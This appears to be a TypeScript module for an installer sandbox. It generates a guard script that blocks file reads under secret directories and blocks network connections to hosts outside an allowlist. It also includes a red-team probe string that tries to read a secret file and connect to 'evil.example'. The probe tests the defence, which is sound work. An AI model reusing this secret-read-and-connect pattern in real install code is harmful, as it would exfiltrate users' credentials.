import { spawn } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import type { InstallerCommandRequest, InstallerCommandResult, InstallerJobRunner } from "./types.js";

export function isSecretPath(target: string, roots: readonly string[]): boolean {
  const resolved = path.resolve(target);
  const left = process.platform === "win32" ? resolved.toLowerCase() : resolved;
  return roots.some((root) => {
    const base = path.resolve(root);
    const right = process.platform === "win32" ? base.toLowerCase() : base;
    const prefix = right.endsWith(path.sep) ? right : `${right}${path.sep}`;
    return left === right || left.startsWith(prefix);
  });
}

export function renderSecretGuard(roots: readonly string[], allowedHosts: readonly string[]): string {
  return `'use strict';
const fs = require('fs');
const net = require('net');
const path = require('path');
const roots = ${JSON.stringify(roots.map((root) => path.resolve(root)))};
const hosts = new Set(${JSON.stringify(allowedHosts.map((host) => host.toLowerCase()))});
function denied(target) {
  if (typeof target !== 'string' && !Buffer.isBuffer(target) && !(target instanceof URL)) return false;
  const text = target instanceof URL ? target.pathname : String(target);
  const resolved = path.resolve(text);
  const left = process.platform === 'win32' ? resolved.toLowerCase() : resolved;
  return roots.some((root) => {
    const right = process.platform === 'win32' ? root.toLowerCase() : root;
    const prefix = right.endsWith(path.sep) ? right : right + path.sep;
    return left === right || left.startsWith(prefix);
  });
}
function fail() {
  const error = new Error('EPERM: secret path denied by install sandbox');
  error.code = 'EPERM';
  throw error;
}
function wrap(fn) {
  if (typeof fn !== 'function') return fn;
  return function guarded(target, ...args) {
    if (denied(target)) fail();
    return fn.call(this, target, ...args);
  };
}
function patch(mod) {
  for (const name of ['readFileSync','readFile','openSync','open','readdirSync','readdir','statSync','lstatSync','accessSync','createReadStream','readlinkSync']) {
    if (typeof mod[name] === 'function') mod[name] = wrap(mod[name]);
  }
  if (mod.promises) {
    for (const name of ['readFile','open','readdir','stat','lstat','access','readlink']) {
      if (typeof mod.promises[name] === 'function') mod.promises[name] = wrap(mod.promises[name]);
    }
  }
}
patch(require('fs'));
try { patch(require('node:fs')); } catch (error) { /* node:fs is already patched via fs */ }
const connect = net.connect.bind(net);
function blockedHost(options) {
  const host = typeof options === 'string' ? '' : options && (options.host || options.hostname) || '';
  return host && !hosts.has(String(host).toLowerCase());
}
function refuse(host) {
  const error = new Error('EPERM: non-registry host ' + host + ' denied by install sandbox');
  error.code = 'EPERM';
  throw error;
}
net.connect = function guardedConnect(options, ...args) {
  if (blockedHost(options)) refuse(options && (options.host || options.hostname));
  return connect(options, ...args);
};
net.createConnection = net.connect;
`;
}

export const RED_TEAM_PROBE = `
const fs = require('fs');
const net = require('net');
const target = process.env.EF_PROBE_SECRET || '';
let leaked = false;
let secretDenied = false;
try {
  fs.readFileSync(target);
  leaked = true;
} catch (error) {
  secretDenied = Boolean(error && error.code === 'EPERM');
}
if (!secretDenied) leaked = true;
let networkDenied = false;
try {
  net.connect({ host: 'evil.example', port: 443 });
  leaked = true;
} catch (error) {
  networkDenied = Boolean(error && error.code === 'EPERM');
}
if (!networkDenied) leaked = true;
process.exit(leaked ? 0 : 2);
`;

export function spawnInstallerCommand(request: InstallerCommandRequest): Promise<InstallerCommandResult> {
  return new Promise((resolve, reject) => {
    const child = spawn(request.file, [...request.args], {
      cwd: request.cwd,
      env: { ...request.env },
      windowsHide: true,
      shell: false,
    });
    const stdout: Buffer[] = [];
    const stderr: Buffer[] = [];
    child.stdout?.on("data", (chunk: Buffer) => {
      stdout.push(chunk);
    });
    child.stderr?.on("data", (chunk: Buffer) => {
      stderr.push(chunk);
    });
    const timer = setTimeout(() => {
      child.kill();
    }, request.timeoutMs);
    child.on("error", (error) => {
      clearTimeout(timer);
      reject(error);
    });
    child.on("close", (code) => {
      clearTimeout(timer);
      resolve({
        exitCode: code,
        stdout: Buffer.concat(stdout).toString("utf8"),
        stderr: Buffer.concat(stderr).toString("utf8"),
      });
    });
  });
}

export function createGuardedJobRunner(): InstallerJobRunner {
  return { runCommand: spawnInstallerCommand };
}

export function writeSecretGuard(directory: string, roots: readonly string[], allowedHosts: readonly string[]): string {
  fs.mkdirSync(directory, { recursive: true });
  const guardPath = path.join(directory, "secret-guard.cjs");
  fs.writeFileSync(guardPath, renderSecretGuard(roots, allowedHosts));
  return guardPath;
}
